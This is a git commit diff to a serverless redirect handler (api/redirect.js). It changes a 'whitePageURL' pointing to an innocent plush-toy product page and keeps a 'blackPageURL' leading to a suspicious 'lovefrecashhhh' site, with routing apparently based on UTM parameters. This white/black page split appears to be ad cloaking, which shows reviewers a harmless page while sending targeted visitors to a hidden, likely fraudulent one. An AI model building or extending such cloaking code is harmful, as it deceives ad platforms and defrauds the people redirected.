01bb16bbdbd3a74f8fa8ac175d3c9d6718f4bfaa
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-02 03:08:43 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.sigikid-usa.com/collections/only-natures-materials/products/organic-dog-plush-toy";
+    const whitePageURL = "https://shopmercimilo.com/collections/traditional-toys/products/new-heirloom-stuffed-animals-german-wire-haired-puppy";
     const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
